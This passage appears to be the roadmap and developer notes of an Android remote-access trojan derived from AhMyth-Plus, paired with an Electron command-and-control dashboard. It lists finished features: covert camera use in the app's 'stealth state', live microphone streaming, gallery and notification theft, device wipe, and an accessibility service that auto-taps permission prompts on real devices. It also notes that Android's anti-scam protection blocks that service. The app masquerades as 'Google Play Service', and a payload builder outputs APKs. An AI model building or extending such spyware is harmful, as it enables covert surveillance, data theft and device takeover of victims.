  (bytes) under `c2_out/<device>/` and list them in the dashboard Downloads
  panel (done; verified end-to-end with `mc` + `fm-dl`).
- [x] **Fix the `sc` screen-capture flow** — consent requested unconditionally
  at launch; `MainService` upgrades its FGS type to `specialUse |
  mediaProjection` after consent and creates the single `MediaProjection`;
  one keep-alive `VirtualDisplay` is shared so captures don't hit the
  Android 14+ single-`createVirtualDisplay` limit (done; verified on Android
  17 emulator with two back-to-back captures).
- [x] **Reconnection / socket churn** — `reconnectionDelayMax` was ~11.5 days
  (a dropped connection never retried). Now `reconnectionDelay=2000` /
  `reconnectionDelayMax=30000` (retry forever, capped at 30s). Verified: the
  app survives a real reboot and re-attaches via the boot receiver, and a
  mid-session drop reconnects instead of dying.
- [x] **Background camera (camera-type FGS)** — added `camera` to the FGS
  types + `FOREGROUND_SERVICE_CAMERA`, so `cam-on` works while the app is
  backgrounded on Android 11+ (the app's normal stealth state).
- [x] **Notification listener actually streams** — the listener is now started
  by the service and bound via the Settings UI toggle; `x0000nt` verified.
- [x] **Destructive orders hardened** — `lock`/`wipe`/`reboot` never fail
  silently (clean error responses), `wipe` uses the correct `wipeData(0)`,
  and the boot-receiver NPE on device-admin orders is fixed. `lock` + `reboot`
  verified on the emulator; `wipe` OS-refused by this AVD's provisioning.
- [x] **One-shot setup + full test automation** — `tools/auto_setup.sh`
  (install → all permissions → device admin → notification listener → launch)
  and `tools/feature_test.sh` (20-check line-by-line pass).
- [x] **Gallery dump** — `x0000getAllImages` / `x0000getImage` (inherited from
  AhMyth-Plus, modernized — no deprecated `DATA` column), saved as readable
  `.txt` / `.jpg`. Verified on the emulator.
- [x] **Live mic stream** — `x0000listenMic` (inherited from AhMyth-Plus): the
  agent streams `audioData` PCM chunks, the C2 accumulates them and writes a
  `.wav` on `audioDataStop`. Verified on the emulator (254 KB WAV).
- [x] **Desktop control panel (Electron)** — inherited from AhMyth-Plus and
  modernized: no `remote` module, contextIsolation on, hand-rolled
  Engine.IO v3 server core (the agent cannot parse stock socket.io 2.x EIO=4
  framing), dashboard + victim lab + notification popups.
- [x] **Linux build** — electron-builder `AppImage` (100 MB) + `deb` (70 MB)
  artifacts in `desktop/dist/`; `npm run build:linux`.
- [x] **Heartbeat churn fix** — desktop server heartbeats every 5s so polls
  stay under the agent's 10s OkHttp read timeout (root-caused via server
  tracing: 10s-aligned polls were aborted by the timeout).
- [x] **Server protocol unit test** — `desktop/test/server.test.js` drives a
  full connect/ack/ping/event/binary/order cycle (`cd desktop && npm test`).
- [x] **In-app auto-grant wizard** — `MainActivity` chains every consent
  screen (permissions → device admin → notification access → battery →
  overlay → storage → screen-capture) and auto-advances; `AutoGrantService`
  (accessibility) auto-taps `Allow/Activate/OK`. No adb, no PC scripts — the
  no-PC onboarding path for real devices (Android 17's anti-scam protection
  blocks the accessibility toggle itself, so it is best-effort there).
- [x] **Desktop payload builder** — `/api/build` + Payload Builder card:
  `gradle assembleDebug -Pc2Url= -Pc2DeviceId=`, APK copied to `payloads/`
  with sha256, `JAVA_HOME` auto-detected.
- [x] **Richer data orders** — `dinfo` (device fingerprint), `battery`,
  `accounts`, `apps-run` (process list), `wifi` (SSID/RSSI/IP), `buzz`
  (vibrate); all aliases + quick buttons on the dashboard; verified live on
  the Android 17 emulator.
- [ ] **Physical-device re-test** — re-run the emulator's green pass on the
  vivo (wireless adb re-pairing needed; `mic-live`/`img-ls` pending on the
  phone).
- [ ] **More Android unit tests** — `C2Config` edge cases (malformed JSON,
  oversized file), plus tests for the destructive-order error paths and
  `NotificationService`.
- [x] **Windows control-panel build** — `electron-builder --win` config
  (`portable` target); a `windows-latest` job in the release workflow
  produces the `.exe` alongside the Linux artifacts on every `v*` tag push.
- [ ] **Per-device targeting on the dashboard** — search/filter devices, and
  show which orders each device has responded to.

---

## Removing the app from a device

1. **Remove Device Admin first**, or the app can block uninstall:
   Settings → Security → Device admin apps → deactivate "Google Play Service".
2. Uninstall: `adb uninstall com.android.background.services`, or long-press the
   icon → Uninstall.
3. Delete the pushed config: `adb shell rm /sdcard/Download/c2_config.json`.
4. If the notification listener is active, remove it from
   Settings → Apps → Special access → Notification access before uninstalling.

---

## Development & tests

Local JVM unit tests:

```bash
./gradlew :app:testDebugUnitTest
```

Tests cover `C2Config` (runtime config parsing/fallbacks) and `FileManager`
(size formatting). Instrumented tests (`androidTest`) require a device or AVD.

Desktop control panel tests (zero-dependency, Node ≥ 16):

```bash
cd desktop && npm test
```

`desktop/test/server.test.js` boots the server on an ephemeral port and asserts
the exact agent-facing wire format: raw handshake, `40{"sid":...}` ack with a
distinct sio sid, ping→pong, JSON + binary event persistence, and the
`42["order",{...}]` delivery format.
